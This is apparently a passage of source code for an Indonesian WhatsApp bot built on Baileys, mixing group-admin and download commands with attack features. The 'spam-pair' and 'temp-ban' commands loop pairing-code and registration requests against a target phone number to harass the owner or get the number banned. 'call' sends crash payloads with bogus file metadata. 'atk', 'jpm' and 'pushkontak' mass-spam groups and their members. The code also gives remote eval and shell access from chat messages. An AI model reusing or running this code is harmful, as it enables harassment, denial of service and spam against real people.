let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await tdx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
xreply(`User ID: ${user.id}`)
let ctf = `❗Hello @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
tdx.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 2gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await xreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case 'join': {
if (!isDeveloper) return
if (!text) return xreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
xreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await tdx.groupAcceptInvite(result).then((res) => xreply(jsonformat(res))).catch((err) => xreply(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isDeveloper) return
await reaction(m.chat, "🔁")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'; /**/ users = users || m.chat
if (users.includes('@g.us')) return xreply("Loh, @g.us ? 🧐")
await tdx.updateBlockStatus(users, 'block').then((res) => xreply(jsonformat(res))).catch((err) => xreply(jsonformat(err)))
await reaction(m.chat, "✅")
}
break
//=================================================//
case 'unblock':
if (!isDeveloper) return
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await tdx.updateBlockStatus(users, "unblock")
await xreply(`Sukses unblock user`)
} else if(!q){
xreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return xreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return xreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await tdx.updateBlockStatus(woke, "unblock")
xreply(`Sukses unblock ${woke}`)
} else if(!q){
xreply("Masukan nomer yang ingin di unblock")
}

}
break
//=================================================//
case 'listblock':{
let block = await tdx.fetchBlocklist()
xreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot':{
if (!isDeveloper) return
await reaction(m.chat, "🔁")
if(m.quoted){
const media = await tdx.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await tdx.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await xreply(`${mess.success}`)
await reaction(m.chat, "✅")
} else xreply("Reply fotonya")
}
break
//=================================================//
case 'delppbot': {
if (!isDeveloper) return
tdx.removeProfilePicture(tdx.user.id)
xreply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isDeveloper) return
if (!q) return xreply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await tdx.updateProfileStatus(q)
await xreply(`Berhasil mengganti status bio ke *${q}*`)
}
break
//=================================================//
case 'leavegc':{
if (!isDeveloper) return
if (!isGroup) return
await tdx.groupLeave(m.chat)
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isDeveloper) return xreply(mess.usingsetpp)
if (!isGroup) return xreply(mess.ingroup)
await reaction(m.chat, "🔁")
if (!isAdmins) return xreply(mess.admin)
if (!/image/.test(mime)) return xreply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return xreply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await tdx.downloadAndSaveMediaMessage(m)
await tdx.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
xreply('done')
await reaction(m.chat, "✅")}
break
//=================================================//
case 'editsubjek': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!q) return xreply(`Example *${prefix + command} penis*`);
await reaction(m.chat, "🔁")
await tdx.groupUpdateSubject(m.chat, text)
await reaction(m.chat, "✅")}
break
//=================================================//
case 'editdesk': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!q) return xreply(`Example *${prefix + command} penis*`);
await reaction(m.chat, "🔁")
await tdx.groupUpdateDescription(m.chat, text)
await reaction(m.chat, "✅")}
break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
await reaction(m.chat, "🔁")
let response = await tdx.groupInviteCode(m.chat)
tdx.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'resetlinkgc': case 'revoke': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
await reaction(m.chat, "🔁")
tdx.groupRevokeInvite(m.chat)
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'linkgc': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
await reaction(m.chat, "🔁")
let response = await tdx.groupInviteCode(m.chat)
xreply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`)
await reaction(m.chat, "✅")}
break
//=================================================//
case 'kick': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tdx.groupParticipantsUpdate(m.chat, [users], 'remove')
xreply(mess.done)
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'add': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tdx.groupParticipantsUpdate(m.chat, [users], 'add')
xreply(mess.done)
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'promote': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tdx.groupParticipantsUpdate(m.chat, [users], 'promote')
xreply(mess.done)
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'demote': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await tdx.groupParticipantsUpdate(m.chat, [users], 'demote')
xreply(mess.done)
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'hidetag': {
if (!isGroup) return xreply(mess.ingroup)
if (!isBotAdmins) return xreply(mess.notadmin)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
tdx.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'tagall': {
if (!isGroup) return xreply(mess.ingroup)
if (!isAdmins) return xreply(mess.admin)
await reaction(m.chat, "🔁")
let teks = `─── ▻ [ *Tag All* ] ◅ ───

 ⬡ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `▢ @${mem.id.split[0]}\n`
}
tdx.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
 await reaction(m.chat, "✅")}
break
//=================================================//
case 'atk': {
if (!isDeveloper) return
let imgsc = await prepareWAMessageMedia({
image: subaru
}, {
upload: tdx.waUploadToServer
})
let gcall = Object.values(await tdx.groupFetchAllParticipating().catch(_=> null))
let rows = []

await gcall.forEach((u, i) => {
let anjay = {
header: u.subject,
title: `Attack Group | Status - ( ${u.announce == true ? "Group Closed" : "Group Open"} )`,
id: `.getview ${u.id}`
};
rows.push(anjay)
});

var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: true
},
body: {
text: "  - # Last Version Execution 🏴‍☠️"
},
footer: {
text: "! Select the group to execute "
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Powered By Last Version",
sections: [{
title: "Only Open groups can be Executed",
rows: rows
}]
})
}],
messageParamsJson: ""
}
}
}
}
}), { userJid: m.chat, quoted: m })
tdx.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
break
case 'pushkontak': {
if (!isDeveloper) return
if (!q) return xreply(`*Example : ${prefix + command} ngab, save ryo*`)

let imgsc = await prepareWAMessageMedia({
image: subaru
}, {
upload: tdx.waUploadToServer
})
let gcall = Object.values(await tdx.groupFetchAllParticipating().catch(_ => null))
let rows = []
gcall.forEach((u, i) => {
let anjay = {
header: u.subject,
title: `#Push - Contact | Status - ( ${u.announce == true ? "Group Closed" : "Group Open"} )`,
id: `.adddelay_1 ${u.id}|${q}`
}
rows.push(anjay)
})
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: true
},
body: {
text: "  - # Last Version - Push Contact 🏴‍☠️"
},
footer: {
text: "! Select a group to Push Ctt to that group !!"
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Powered By Last Version",
sections: [{
title: "Only Open groups can be Push Contact",
rows: rows
}]
})
}],
messageParamsJson: ""
}
}
}
}
}), { userJid: m.chat, quoted: m })
tdx.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
break
case 'mmq': {
m.reply("k"+q)
}
break
case 'adddelay_1': {
if (!isDeveloper) return
let [puki, laso] = q.split("|")
tdx.relayMessage(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
hasMediaAttachment: false
},
body: {
text: "  Push - Contact 2nd Phase 🏴‍☠️"
},
footer: {
text: "! Select a delay Tiime For PushCtt !!"
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Powered By Last Version",
sections: [{
title: "Only Open groups can be Push Contact",
rows: [{
header: "# 1 ( One ) Second",
title: `Timestap --> 1000 ( milisecond )`,
id: `.pcct_res 1000|${puki}|${laso}`
},
{
header: "# 2 ( Two ) Second",
title: `Timestap --> 2000 ( milisecond )`,
id: `.pcct_res 2000|${puki}|${laso}`
},
{
header: "# 3 ( Three ) Second",
title: `Timestap --> 3000 ( milisecond )`,
id: `.pcct_res 3000|${puki}|${laso}`
},
{
header: "# 4 ( four ) Second",
title: `Timestap --> 4000 ( milisecond )`,
id: `.pcct_res 4000|${puki}|${laso}`
},
{
header: "# 5 ( Five ) Second",
title: `Timestap --> 5000 ( milisecond )`,
id: `.pcct_res 5000|${puki}|${laso}`
},
{
header: "# 6 ( Six ) Second",
title: `Timestap --> 6000 ( milisecond )`,
id: `.pcct_res 6000|${puki}|${laso}`
},
{
header: "# 7 ( Seven ) Second",
title: `Timestap --> 7000 ( milisecond )`,
id: `.pcct_res 7000|${puki}|${laso}`
}]
}]
})
}],
messageParamsJson: ""
}
}
}
}
}, {})
}
break

case 'pcct_res': {
if (!isDeveloper) return
let [puki, laso, bijikolot] = q.split("|")
if (!puki && !laso && !bijikolot) xreply(`Ga gitu tolol, gini : \n*${prefix + command} 1000|idgc|teks*`)

let metadata2 = await tdx.groupMetadata(laso)
let colls = metadata2.participants
for (let mem of colls) {
var etc = generateWAMessageFromContent(mem.id.split('@')[0] + "@s.whatsapp.net", proto.Message.fromObject({
extendedTextMessage: {
text: bijikolot
}
}), { userJid: mem.id.split('@')[0] + "@s.whatsapp.net", quoted: vidq })
await tdx.relayMessage(mem.id.split('@')[0] + "@s.whatsapp.net", etc.message, { participant: { jid: mem.id.split('@')[0] + "@s.whatsapp.net" }, messageId: etc.key.id })
await sleep(puki)
}
}
break


// Dari om reza / Skyzoo -----> https://youtube.com/@skyzooffc?si=2egyU2OBlpsVDayL
case "jpmhidetag": case "jpmht": {
if (!isDeveloper) return
if (!text && !m.quoted) return xreply(`Example : \n\n*${prefix + command} jual kontol harga 5k, minat ? pm*`)
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await tdx.groupFetchAllParticipating()
let groups = await Object.keys(getGroups)
let jidawal = m.chat
await xreply(`*Memproses Jpm ⏳*

* Tipe : *Teks & Hidetag*
* Total Grup : *${groups.length} Grup*`)
var ments = []
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${ownMain}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})}
}}, {userJid: m.sender, quoted: vidq})
for (let jid of groups) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await tdx.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
await xreply(`*Jpm Berhasil ✅* Total Grup Yang Berhasil Dikirim Pesan *${total} Grup*`)
}
break
case "jpmhidetag2": case "jpmht2": {
if (!isDeveloper) return
if (!text) return xreply(`Example : \n\n${prefix + command} jual kontol harga 5k, minat ? pm`)
if (!/image/.test(mime)) return xreply(`Example : \n\n*${prefix + command} jual kontol harga 5k, minat ? pm*\n\nNote : reply to the image you want to use with the text`)
const image = await tdx.downloadAndSaveMediaMessage(qmsg)
var teks = text
const jidawal = m.chat
let total = 0
let getGroups = await tdx.groupFetchAllParticipating()
let groups = await Object.keys(getGroups)
await xreply(`*Memproses Jpm ⏳*

* Tipe : *Hidetag Teks & Foto*
* Total Grup : *${groups.length} Grup*`)
var ments = []
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: tdx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${ownMain}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: vidq})
for (let jid of groups) {
try {
ments = getGroups[jid].participants.map(e => e.id)
await tdx.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
await xreply(`*Jpm Berhasil ✅*
Total Grup Yang Berhasil Dikirim Pesan *${total} Grup*`)
}
break
case "jpm": {
if (!isDeveloper) return
if (!text) return xreply(`Example : \n\n${prefix + command} jual kontol harga 5k, minat ? pm`)
var teks = m.quoted ? m.quoted.text : text
let total = 0
const jidawal = m.chat
let getGroups = await tdx.groupFetchAllParticipating()
let groups = await Object.keys(getGroups)
await xreply(`*Memproses Jpm ⏳*

* Tipe : *Teks*
* Total Grup : *${groups.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${ownMain}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: vidq})
for (let jid of groups) {
try {
await tdx.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await xreply(`*Jpm Berhasil ✅*
Total Grup Yang Berhasil Dikirim Pesan *${total} Grup*`)
}
break
case "jpm2": {
if (!isDeveloper) return
if (!text) return xreply(`Example : \n\n${prefix + command} jual kontol harga 5k, minat ? pm`)
if (!/image/.test(mime)) return xreply(`Example : \n\n*${prefix + command} jual kontol harga 5k, minat ? pm*\n\nNote : reply to the image you want to use with the text`)
let image = await tdx.downloadAndSaveMediaMessage(qmsg)
let total = 0
const jidawal = m.chat
let getGroups = await tdx.groupFetchAllParticipating()
let groups = await Object.keys(getGroups)
await xreply(`*Memproses Jpm ⏳*

* Tipe : *Teks & Foto*
* Total Grup : *${groups.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: tdx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${ownMain}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}),
})} 
}}, {userJid: m.sender, quoted: vidq})
for (let jid of groups) {
try {
await tdx.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
await xreply(`*Jpm Berhasil ✅*
Total Grup Yang Berhasil Dikirim Pesan *${total} Grup*`)
}
break

case 'tiktok': case 'tt': { // DARI OM REZA
if (!q) {
await xreply(`Example : *${prefix + command} https://vt.tiktok.com/ZSYbo5umU/.*`)
await reaction(m.chat, "❗")
}
if (!/tiktok.com/.test(q)) return xreply("*Link Invalid !*")
xreply(mess.wait)
 let anuan = q
await fg.tiktok(anuan).then(async (res) => {
var cap = `© tdx Client - #Last Version`
if (res.result.duration == 0) {
if (res.result.images.length > 1) {
let araara = new Array()
let urutan = 0
for (let a of res.result.images) {
let imgsc = await prepareWAMessageMedia({ image: await fetch(`${a}`)}, { upload: tdx.waUploadToServer })
await araara.push({
header: {
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
},
nativeFlowMessage: {
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a}\",\"merchant_url\":\"https://www.google.com\"}`
}]
},
footer: {
 text: `© Spider Client - #Last Version`
}
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: "Tiktok Slide Result"
},
carouselMessage: {
cards: araara
}
}}
}}, {userJid: m.sender, quoted: m})
await tdx.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await reaction(m.chat, "✅")
} else {
tdx.sendMessage(m.chat, {image: {url: result.data.images[0]}, caption: cap}, {quoted: m})
}
} else {
let vidnya = await prepareWAMessageMedia({ video: await fetch(`${res.result.play}`)}, { upload: tdx.waUploadToServer })
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
interactiveMessage: {
contextInfo: { 
mentionedJid: [m.sender]
}, body: { 
text: cap
}, 
header: {
hasMediaAttachment: true,
...vidnya
},
nativeFlowMessage: { 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Video\",\"url\":\"${q}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}
}}
}}, {userJid: m.sender, quoted: m}) 
await tdx.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await reaction(m.chat, "✅")
}
}).catch(e => xreply(`${e}`))
}
break
case 'spam-pair': {
if (!isDeveloper) return 
if (!q) return xreply(`Example : \n\n*${prefix + command} +62 882-2132-5473*`)
await reaction(m.chat, "✅")
let target = q.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()

let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (;;) {
for (let i = 0; i < 48; i++) {
await sleep(1000)
let prc = await sucked.requestPairingCode(target)
await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
}
await sleep(15000)
}
}
break
case 'temp-ban': {
if (!isPremium) return xreply(mess.prem)
if (!text) return xreply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return xreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let cCode = q.split("")[0]
let number = q.split("")[1]
let fullNo = cCode + number
await reaction(m.chat, "✅")

let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })
for (;;) {
try {
let res = await sucked.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(400)
}
} catch (error) {
console.error(error)
}
}
}
break

case 'call': {
if (!isDeveloper) return 
if (!q) return xreply(`Example : \n\n*${prefix + command} 5*`);
for (let i = 0; i < q; i++) {
await tdx.relayMessage( m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...(await prM({ document: akame, fileName: " ⭑𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ▻ # 𝖢𝗋𝖺𝗌𝗁 𝖦𝖺𝗅𝖺𝗑𝗒 :)", fileLength: "9999999999999", pageCount: 9999999999999, contactVcard: true, mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0", thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=", thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=", jpegThumbnail: (await resize(banner, 276, 100)) })),
title: "*# ~ here with me - Spider v7 :)*‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
hasMediaAttachment: true,
},
body: {
text: "",
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "call_permission_request",
buttonParamsJson: `{}`
},
{
name: "galaxy_message",
buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY KING SAM\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
},
]
}
}
}
}
}, {})
}
}
break
default:
}
}
if (budy.startsWith("=>")) {
if (!isDeveloper) return
try {
const result = await eval(`(async () => { return ${budy.slice(3)} })()`)
m.reply(util.format(result))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith(">")) {
if (!isDeveloper) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith("$")) {
if (!isDeveloper) return
exec(budy.slice(2),
(err, stdout) => {
if (err) return m.reply(err.toString())
if (stdout) return m.reply(stdout.toString())
})
}
} catch (err) {
const handleError = async () => {
tdx.sendMessage(global.ownMain + "@s.whatsapp.net", {
text: require("util").format(err)
}, {
quoted: m
})
new Promise(resolve => setTimeout(resolve, 2000))
/*m.reply(`!Eror, error details will be sent to bot contributors ✓

${util.format(err)}`)*/
console.log(util.format(err))
}
handleError()
}
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(color(`Update ${__filename}`, "green"))
delete require.cache[file];
require(file);
});